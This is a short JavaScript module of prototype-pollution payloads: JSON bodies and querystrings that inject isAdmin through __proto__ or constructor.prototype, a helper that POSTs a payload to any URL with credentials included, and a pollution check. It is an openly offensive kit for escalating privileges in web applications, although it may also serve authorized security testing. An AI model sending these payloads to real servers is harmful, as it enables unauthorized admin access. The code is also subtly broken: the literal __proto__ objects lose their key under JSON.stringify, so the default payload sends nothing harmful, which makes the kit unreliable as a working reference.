const POLLUTION_PAYLOADS = {
  protoIsAdmin: { __proto__: { isAdmin: true } },
  constructorProto: { constructor: { prototype: { isAdmin: true } } },
  nested: { a: { __proto__: { polluted: "yes" } } },
};

const POLLUTION_QUERYSTRINGS = [
  "__proto__[isAdmin]=true",
  "__proto__.isAdmin=true",
  "constructor[prototype][isAdmin]=true",
];

async function sendJsonPollution(url, payload = POLLUTION_PAYLOADS.protoIsAdmin) {
  const res = await fetch(url, {
    method: "POST",
    credentials: "include",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
  return await res.text();
}

function isPolluted(prop = "isAdmin") {
  return ({})[prop] !== undefined;
}

module.exports = {
  POLLUTION_PAYLOADS,
  POLLUTION_QUERYSTRINGS,
  sendJsonPollution,
  isPolluted,
};
